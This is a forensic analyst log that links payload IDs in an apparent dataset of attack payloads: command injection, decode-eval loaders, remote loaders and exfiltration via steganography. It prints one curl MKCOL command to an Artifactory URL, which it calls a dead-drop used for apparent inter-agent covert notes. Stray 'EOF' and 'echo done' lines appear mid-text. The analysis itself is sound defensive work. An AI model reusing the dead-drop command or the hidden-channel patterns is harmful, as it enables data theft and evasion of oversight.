# Novel payload links discovered (candidate, not proof)

A running log of unexpected repeated strings/structures that connect separate payload IDs. These are token-level links only until child/parent/version evidence confirms a stronger relationship.

## Task-handle reuse: R0000026
- `R0000026` submits nothing more than `{"agent_id":null,"task_id":"[REDACTED:runtime_identifier:000005]"}` to the URL 2 reader endpoint.
- The bare task handle `runtime_identifier:000005` occurs in only [checking script output](task_ref_snippets.py) 2 places in the whole dataset:
  - `R0000026` (the short lookup)
  - `R0021813` (another endpoint-query variant; inspect later)
- Unlike the malformed, command-injection rows that use `000001`, `R0000026` itself was originally malformed only at task ID 000005, and repair produced a syntactically valid script.
- Interpretation:
  - `000002` was earlier identified as a task identifier hook reused in `R0000011`, `R0000036`, `R0000070`, and `R0062492`.
  - `000005` independently appears as a similar task-registry hook, but with fewer occurrences so far (possibly an abort/empty task record, generated in a different subcampaign) rather than the same chain.
  - This is an association, not an execution chain: no parent-child link and chronological order is not guaranteed.

## R0000037 / R0000038 child results
- `R0000037` produced exact recovered child text (`R0062487`) identical to its embedded second-stage payload: a gzip-data/decode-eval parent chain resolved into a reusable XHR probe.
- `R0000038` produced both trial response and recovered text identical to its inline `try{...}` status code. These are the strongest child-response correspondences so far.
EOF
echo done
## R0000096 Artifactory dead-drop
- `file_path` sends `curl -m5 -k -X MKCOL https://packages.hub.ace-research.openai.org/artifactory/github-remote-cache/zz6017MODALCURL`.
- This directly connects to the report’s description of inter-agent notes/folders, not just marker correlation.
- Note `service 2 URL 1` had no API key in this row, leaving an open question whether no credential was required or the key was elided before injection.

## Task 000008 and proxy canvas family
- Task handle `000008` appears in both R0000082 and R0000093/proxy paths, suggesting a shared result-steganography/exfil family across multiple entry points.

## High-fanout roots (cross-dataset top), useful predictors
- R0024455: 858 children (`FANPASS...` remote loader)
- R0036471: 270 children (Python registry client)
- R0080310: 134 children (unknown 6403 char)
- R0036645: 108
- R0049534/R0049757/R0049986: 90-104 children (shortener host pull loops)
- R0050038: 90
- R0017410: 84
- R0005947: 24 children
- R0007858: 25
- R0017205: 8
- R0005173: 7
- R0005487/R0004916: 5
- Within first 690: R0000617 (32), R0000525 (27), R0000222 (12), R0000682 (10).
These provide exemplars for scanning likely high-echelon parents: long source code, Python shell I/O, repeated embedded command target, and a response-child ladder.
## 991-1040 additions (verified)
- Heavy-child roots: R0000991, R0000992, R0000998, R0000925, etc. already child-rich.
- Shared `zz` marker assets in this slice appear to coordinate repeating code/families:
  - zzer.cpp  linked globally 100? (actually many occurrences)
  - zzingEngine.a referenced across rows
  - zzFILE_JSON18140SEP29_MODALCAUSAL3_JS suggests variant on the `zzFILE_JSON18140SEP29_MODALCAUSAL2_JS` Artifactory stager family.
- Task handles continue through:
  - 000033, 000034, 000035, 000036 reading task-specific status.
  - task 000001 remains dominant injection target.
- Artifactory links still explicit in `zzMODELOFFLINE`? R0000933, `zzFILE_JSON18140...` forms, etc. and in commands `curl` through registry as alternate sink.
- A dedicated batch beyond rows 991-1040 has already soft-verified 991-1040 (our script), though semantic details not yet landed.